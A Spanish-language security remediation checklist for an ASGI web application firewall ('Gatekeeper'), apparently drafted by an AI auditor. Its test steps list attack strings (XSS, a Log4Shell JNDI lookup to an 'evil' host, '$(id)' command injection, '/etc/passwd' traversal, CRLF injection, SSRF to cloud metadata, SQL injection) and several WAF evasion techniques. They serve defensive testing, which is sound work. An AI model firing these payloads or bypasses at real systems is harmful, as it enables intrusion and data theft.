# Plan de Cierre de Seguridad (Rumbo al 97 / 100) — Gatekeeper (`gatekeeper-asgi`)

- **Auditor y Arquitecto de Cierre**: Argon (Antigravity)
- **Rama de trabajo**: `fase7-cobertura`
- **Puntuación inicial tras auditoría**: `78 / 100` (`22 PASA · 16 FALLA · 3 INFO` en `ejecutar_pocs.py`)
- **Puntuación objetivo al completar esta checklist**: **`97 / 100`** (`41/41` controles de seguridad sin ningún `[FALLA]` activo)
- **Documento de referencia**: [AUDITORIA-IA-COMPARATIVA.md](AUDITORIA-IA-COMPARATIVA.md) y [.audit/PACK-REVISOR/SECURITY_REVIEW-IA-Antigravity.md](.audit/PACK-REVISOR/SECURITY_REVIEW-IA-Antigravity.md)

> **Regla de trabajo ([AGENTS.md](AGENTS.md))**: Cada punto se marca como `[x]` únicamente cuando:
> 1. Se ha escrito el test unitario/integración que reproduce el fallo.
> 2. Se ha aplicado el arreglo en `src/gatekeeper/`.
> 3. El PoC correspondiente en `.audit/PACK-REVISOR/ejecutar_pocs.py` pasa a `[PASA]`.
> 4. `evaluate.py --check` y `evaluate_heldout.py --check` confirman **0 detecciones perdidas** y **0 falsos positivos nuevos**.

---

## Progreso Global hacia el 97 / 100

| Bloque | Hallazgos que cierra | Puntos que suma | Estado |
| :--- | :--- | :---: | :---: |
| **Bloque 0 — Higiene y Clean Code del Repositorio** | Limpieza de artefactos, unificación de informes en `.audit/PACK-REVISOR/` y `.gitignore` | Base limpia | `[x]` Completado |
| **Bloque 1 — Motor de Reglas y Normalización (`rules.py`)** | `IA-1` (`/*...*/` global) | **+5.0 pts** (`78` $\rightarrow$ `83`) | `[ ]` Pendiente |
| **Bloque 2 — Prefiltro de Literales $\ge 128$ chars (`rules.py`, `test_prefilter.py`)** | `H-2A`, `H-2B`, `H-2C`, `AG-8` | **+4.5 pts** (`83` $\rightarrow$ `87.5`) | `[ ]` Pendiente |
| **Bloque 3 — Parser Multipart y Cross-Carrier (`body.py`, `middleware.py`)** | `H-1`, `AG-1`, `AG-2`, `AG-3` | **+4.0 pts** (`87.5` $\rightarrow$ `91.5`) | `[ ]` Pendiente |
| **Bloque 4 — Sniffing JSON UTF-16/UTF-32 en `octet-stream` (`body.py`)** | `AG-4` | **+1.5 pts** (`91.5` $\rightarrow$ `93.0`) | `[ ]` Pendiente |
| **Bloque 5 — Cabeceras ASGI Duplicadas y Cuerpos en `GET`/`HEAD`/`OPTIONS` (`middleware.py`)** | `AG-6`, `IA-2`, `IA-3` (doc/política) | **+2.0 pts** (`93.0` $\rightarrow$ `95.0`) | `[ ]` Pendiente |
| **Bloque 6 — Exclusión de Campos (`config.py`), ReDoS (`redos.py`) y Doc NFKC** | `AG-5`, `AG-7`, `IA-5` | **+2.0 pts** (`95.0` $\rightarrow$ `97.0`) | `[ ]` Pendiente |
| **Bloque 7 — Verificación Final de Calidad, Corpus y Documentación** | Suite completa, cobertura $\ge 98\%$, `check_docs.py`, `mkdocs build --strict` | Certificación **97 / 100** | `[ ]` Pendiente |

---

## Checklist Detallada Paso a Paso

### Bloque 0: Higiene, Organización Documental y Clean Code del Repositorio
- [x] Auditar enlaces internos en los 37 documentos vigilados por `tools/check_docs.py` para no romper ninguna ruta.
- [x] Formatear y consolidar las auditorías de los modelos de IA en `.audit/PACK-REVISOR/` (`SECURITY_REVIEW-IA-Antigravity.md`, `SECURITY_REVIEW-IA-Claude.md`, `SECURITY_REVIEW-IA-Cursor.md`, `HISTORIAL-SESIONES-IA.md`).
- [x] Crear el cuadro comparativo maestro de modelos de IA en [AUDITORIA-IA-COMPARATIVA.md](AUDITORIA-IA-COMPARATIVA.md).
- [x] Eliminar artefactos temporales de construcción, worktrees huérfanos (`.audit/wt_f21`, `.audit/dist`, `.audit/site`, `.audit/wheel_*`, `gatekeeper-v0.3/gatekeeper/site`, `gatekeeper-v0.3/gatekeeper/dist`, `.qodo`), scripts de edición de un solo uso (`.audit/editar.py`, `.audit/f4_edits.py`) y documentos duplicados no enlazados (`.audit/PLAN-100-PUNTOS-GATEKEEPER.md`, `ADVISORY-0.4.1.md`, `auditoriaDE_IA.MD`).
- [x] Actualizar `.gitignore` para cubrir `.audit/venv*/`, `.audit/wt_*/` y `.qodo/`.
- [x] Verificar que `python gatekeeper-v0.3/gatekeeper/tools/check_docs.py` pasa con 0 errores tras la limpieza.

---

### Bloque 1: Motor de Reglas — Aislar `_strip_sql_comments` (`IA-1`) [+5.0 pts]
> **Problema**: `normalize()` (`src/gatekeeper/rules.py:683`) elimina `/*...*/` antes de evaluar cualquier familia, permitiendo evadir `xss`, `ssti`, `log4shell`, `cmdi`, `crlf`, `path_traversal` y `ssrf` envolviendo el ataque en `/*...*/`.

- [ ] **1.1. Escribir tests primero** en `tests/test_rules.py`:
  - Comprobar que `/*<script>alert(1)</script>*/`, `/*{{7*7}}*/`, `/*${jndi:ldap://evil/a}*/`, `/*$(id)*/`, `/*../../etc/passwd*/`, `/*%0d%0aSet-Cookie:a=1*/` y `/*http://169.254.169.254/latest/meta-data/*/ ` son detectados por sus respectivas familias.
  - Comprobar que `1'/**/OR/**/1=1` y `/*comentario*/ UNION SELECT 1` siguen siendo detectados por `sqli`.
- [ ] **1.2. Implementar el arreglo en `src/gatekeeper/rules.py`**:
  - Quitar `_strip_sql_comments(text)` del flujo destructivo de `normalize()` y aplicarlo como variante adicional en `_variants()` (conservando tanto las variantes con el comentario intacto como la variante con `_strip_sql_comments` aplicado), igual que se hizo con el operador `+` en la Fase 6.4.
- [ ] **1.3. Verificar**:
  - Comprobar que `pocs_ia:ia_comentario` pasa a `[PASA]` en `.audit/PACK-REVISOR/ejecutar_pocs.py`.
  - Ejecutar `tools/evaluate.py --check` y `tools/evaluate_heldout.py --check` (0 falsos positivos nuevos, 0 ataques perdidos).

---

### Bloque 2: Sincronización de `PREFILTER_LITERALS` y Blindaje de `test_prefilter.py` (`H-2A/B/C`, `AG-8`) [+4.5 pts]
> **Problema**: Cuando `len(text) >= 128`, `_vale_la_pena_prefiltrar` descarta familias cuyas firmas no tienen su literal obligatorio en `PREFILTER_LITERALS`. Hoy caen 7 ataques de `corpus/attacks.json` y 59 de `corpus/crs_payloads.json` al añadir 150 bytes de relleno.

- [ ] **2.1. Actualizar `tests/test_prefilter.py` primero (para que falle con los 66 casos)**:
  - En `test_prefiltro_no_pierde_detecciones_en_corpus`, evaluar cada payload tanto sin relleno como con prefijo `"a" * 150 + " " + payload` sobre `corpus/attacks.json`, `corpus/heldout_attacks.json` y `corpus/crs_payloads.json`.
- [ ] **2.2. Completar `PREFILTER_LITERALS` en `src/gatekeeper/rules.py`**:
  - **`sensitive_files`**: añadir `requirements.txt`, `composer.`, `package-lock.json`, `yarn.lock`, `gemfile`, `poetry.lock`, `pom.xml`, `.sql`, `.bak`, `.old`, `.orig`, `.save`, `.swp`, `wp-content/`, `/log`, `ignore`, `/proc/`, `.n8n`, `.aider`, `.zed`, `.roo`, `.cline`, `.continue`, `.codex`, `.opencode`, `.kiro`, `.augment`, `.devin`, `.tabnine`, `.cody`, `.gemini`, `.junie`, `.qwizard`, `.trae`, `.sourcegraph`, `.fabric`, `.plandex`, `.a0proj`, `.rovodev`, `.copilot`.
  - **`sqli`**: añadir `||`, `::json`, `<@`, `@>`, `load_file`, `sqlite_compileoption_used`, `pg_read_file`, `out_file`, `'not`, `is not`, `chr(`, `xmltype(`, `rawtohex(`, `hextoraw(`, `unhex(`, `if(`, `<<`, `date_add(`.
  - **`xss`**: añadir `<style`, `@import`, `expression`, `-moz-binding`, `j\t`, `j\n`, `j\r`, `j\x00`.
- [ ] **2.3. Verificar**:
  - Comprobar que `pytest tests/test_prefilter.py` pasa al 100 %.
  - Comprobar que `pocs_gemini:prefilter_sensitive_files`, `pocs_gemini:prefilter_sqli`, `pocs_gemini:prefilter_xss_style` y `pocs_antigravity:ag8_corpus_prefilter_drop` pasan a `[PASA]`.
  - Medir latencia con `benchmarks/latency.py` para confirmar que el coste por petición sigue dentro del presupuesto.

---

### Bloque 3: Blindaje de `multipart/form-data` y Cross-Carrier (`H-1`, `AG-1`, `AG-2`, `AG-3`) [+4.0 pts]
> **Problema**:
> 1. `_multipart_boundary` usa `split(";")` sin respetar comillas (`AG-2`) y toma el primer `boundary=` mientras Starlette toma el último (`H-1`).
> 2. `extract_multipart` nunca emite el nombre del campo `name="..."` para su inspección (`AG-1`).
> 3. `_inspect_body` no alimenta `cross_values` cuando `es_multipart` es `True` (`AG-3`).

- [ ] **3.1. Escribir tests primero** en `tests/test_body.py` y `tests/test_middleware.py`:
  - Test de `boundary` duplicado (`boundary=dummy; boundary=real`) y de `;` entrecomillado (`dummy="a; boundary=fake"; boundary=real`).
  - Test de payload SQLi/XSS en `name="..."` de `multipart/form-data`.
  - Test de ataque fragmentado entre query string y campo de texto `multipart/form-data` con `inspect_cross_carrier=True`.
- [ ] **3.2. Implementar el arreglo en `src/gatekeeper/body.py` y `src/gatekeeper/middleware.py`**:
  - En `_multipart_boundary`: usar `_split_params(content_type)[1:]` y quedarse con el **último** `boundary=` válido (idéntico al diccionario de `python-multipart`).
  - En `extract_multipart`: emitir `(nombre, nombre)` por cada parte antes de emitir `(nombre, params["filename"])` o `(nombre, datos)` (ajustando `budget.cuenta` para no cobrar doble).
  - En `_inspect_body` (`middleware.py`): dentro del bloque `if es_multipart:`, añadir los valores de partes de texto no excluidas a `cross_values` cuando `self.config.inspect_cross_carrier` está activo.
- [ ] **3.3. Verificar**:
  - Comprobar que `pocs_gemini:multipart_duplicate_boundary`, `pocs_antigravity:ag1_multipart_field_name`, `pocs_antigravity:ag2_multipart_quoted_semicolon` y `pocs_antigravity:ag3_multipart_cross_carrier` pasan a `[PASA]`.
  - Ejecutar `tools/diferencial_body.py` para verificar la paridad con Starlette y FastAPI.

---

### Bloque 4: Sniffing de JSON UTF-16 / UTF-32 bajo `application/octet-stream` (`AG-4`) [+1.5 pts]
> **Problema**: `looks_like_json(raw)` solo comprueba BOM UTF-8 + `{`/`[` en ASCII. Un JSON en UTF-16 o UTF-32 con `Content-Type: application/octet-stream` (o sin `Content-Type`) devuelve `False` en `looks_like_json`, evade el WAF (`200 OK`) y es decodificado por `await request.json()`.

- [ ] **4.1. Escribir tests primero** en `tests/test_body.py`:
  - Cuerpos JSON codificados en `utf-16`, `utf-16-le`, `utf-16-be`, `utf-32`, `utf-32-le`, `utf-32-be` enviados con `Content-Type: application/octet-stream` y sin `Content-Type`.
- [ ] **4.2. Implementar el arreglo en `src/gatekeeper/body.py`**:
  - En `looks_like_json(raw)`: reutilizar la detección de codificación de `_decodificar_json_bytes` (BOMs UTF-16/UTF-32 y patrón de bytes nulos en los primeros 4 bytes) antes de comprobar si el primer carácter no blanco es `{` o `[`.
- [ ] **4.3. Verificar**:
  - Comprobar que `pocs_antigravity:ag4_octet_stream_utf16_json` pasa a `[PASA]`.

---

### Bloque 5: Cabeceras HTTP Duplicadas en ASGI y Cuerpos en `GET`/`HEAD`/`OPTIONS` (`AG-6`, `IA-2`, `IA-3`) [+2.0 pts]
> **Problema**:
> 1. `_header(scope, name)` devuelve solo la primera tupla de `scope["headers"]`, ignorando segundas cabeceras `Cookie` (HTTP/2) y permitiendo falsificar `X-Forwarded-For` si el proxy añade una segunda tupla (`AG-6`).
> 2. `BODY_METHODS` ignora cuerpos enviados en `GET`, `HEAD` y `OPTIONS` (`IA-2`).
> 3. Documentar explícitamente el alcance de `Content-Encoding: gzip` en `docs/amenazas.md` (`IA-3`).

- [ ] **5.1. Escribir tests primero** en `tests/test_middleware.py`:
  - Petición ASGI con dos tuplas `(b"cookie", ...)` donde la segunda contiene un payload SQLi/XSS.
  - Petición ASGI con dos tuplas `(b"x-forwarded-for", ...)` con `trust_proxy=True` y `trusted_proxies=1` donde la primera es falsa y la segunda es la IP bloqueada añadida por el proxy.
  - Petición `GET` con body JSON malicioso hacia un endpoint que lee `await request.json()`.
- [ ] **5.2. Implementar el arreglo en `src/gatekeeper/middleware.py` y `docs/amenazas.md`**:
  - En `_header(scope, name)`: recoger todas las tuplas cuyo `k.lower() == name` y unirlas con `"; "` si `name == b"cookie"` (RFC 9113 §8.2.3) o con `", "` para el resto de cabeceras (RFC 9110 §5.3).
  - En `_inspect_request` / llamadas a `_inspect_body`: inspeccionar el cuerpo también en `GET`, `HEAD` y `OPTIONS` cuando la petición declara o transporta cuerpo (`Content-Length > 0` o `Transfer-Encoding` presente).
  - En `docs/amenazas.md`: documentar explícitamente la política sobre `Content-Encoding` (`gzip`/`br`) y la recomendación de colocar `GZipMiddleware` (si se usa para peticiones) delante de `GatekeeperMiddleware`.
- [ ] **5.3. Verificar**:
  - Comprobar que `pocs_antigravity:ag6_duplicate_headers` e `pocs_ia:ia_metodos` pasan a `[PASA]`.

---

### Bloque 6: Exclusión de Campos (`config.py`), Analizador ReDoS (`redos.py`) y Cota NFKC (`AG-5`, `AG-7`, `IA-5`) [+2.0 pts]
> **Problema**:
> 1. `Config.field_excluded` añade `segmentos[0]` (excluyendo subárboles JSON enteros `/bio/*`), divide por `/` parámetros que no son punteros JSON (`?evil/bio=`), y compila `_exclude_globs` sin `re.IGNORECASE` (`AG-5`).
> 2. `analizar_redos` no detecta clases solapadas `(\w|\d)+$` ni grupos con flags en línea `(?:(?i:(a+))+)$` (`AG-7`).
> 3. `.audit/PACK-REVISOR/ALCANCE.md` citaba expansión NFKC de `4x` en lugar de `18x` (`IA-5`).

- [ ] **6.1. Escribir tests primero** en `tests/test_config.py` y `tests/test_redos.py`:
  - Con `exclude_fields=["bio", "token*"]`: verificar que `{"bio": "1 UNION SELECT 1"}` se excluye (`200`), pero `{"bio": {"sql": "1 UNION SELECT 1"}}` se bloquea (`403`), `?evil/bio=1+UNION+SELECT+1` se bloquea (`403`) y `{"TOKEN_SECRET": "1 UNION SELECT 1"}` se excluye (`200`, glob insensible a mayúsculas).
  - En `test_redos.py`: verificar que `analizar_redos` rechaza `r"(\w|\d)+$"`, `r"([a-z]|a)+$"` y `r"(?:(?i:(a+))+)$"`.
- [ ] **6.2. Implementar el arreglo en `src/gatekeeper/config.py`, `src/gatekeeper/redos.py` y `.audit/PACK-REVISOR/ALCANCE.md`**:
  - En `config.py`:
    - Compilar `_exclude_globs` con `re.compile(fnmatch.translate(f.lower()), re.IGNORECASE)`.
    - En `field_excluded`: eliminar `candidatos.append(segmentos[0])`, y solo extraer `segmentos[-1]` cuando `identificador` sea un puntero JSON (`identificador.startswith("/")`).
  - En `redos.py`:
    - En `_grupos_cuantificados`: reconocer prefijos de flags en línea `(?[aiLmsux-]+:...)`.
    - En `_alternativas_solapadas`: calcular el conjunto de caracteres iniciales (*first-set*) expandiendo `\w`, `\d`, `\s`, `.` y clases `[...]` para detectar intersección entre ramas.
  - En `.audit/PACK-REVISOR/ALCANCE.md` y `.audit/PACK-REVISOR/pocs_ia.py`: actualizar la cota documentada de expansión NFKC (`18x` en caracteres para `U+FDFA`, acotada por `max_body_size` y `max_inspection_time_ms`).
- [ ] **6.3. Verificar**:
  - Comprobar que `pocs_antigravity:ag5_field_excluded_subtree`, `pocs_antigravity:ag7_redos_analyzer_bypass` e `pocs_ia:ia_nfkc` pasan a `[PASA]`.

---

### Bloque 7: Certificación Final 97 / 100
- [ ] Ejecutar `.audit/PACK-REVISOR/ejecutar_pocs.py` y confirmar **`0 FALLA`** en toda la batería combinada.
- [ ] Ejecutar `pytest -q --timeout=300` y `pytest --cov=gatekeeper --cov-fail-under=90 -q`.
- [ ] Ejecutar `ruff check .`, `mypy` y `bandit -r src -q` (0 errores, 0 avisos).
- [ ] Ejecutar `python tools/evaluate.py --check`, `python tools/evaluate_heldout.py --check`, `python tools/evaluate_cross.py --check` y `python tools/import_crs.py --check`.
- [ ] Ejecutar `python tools/check_docs.py` y `python -m mkdocs build --strict`.
- [ ] Actualizar `CHANGELOG.md`, `PLAN-VERIFICADO-100.md` y `AUDITORIA-IA-COMPARATIVA.md` dejando constancia del cierre en **97 / 100**.
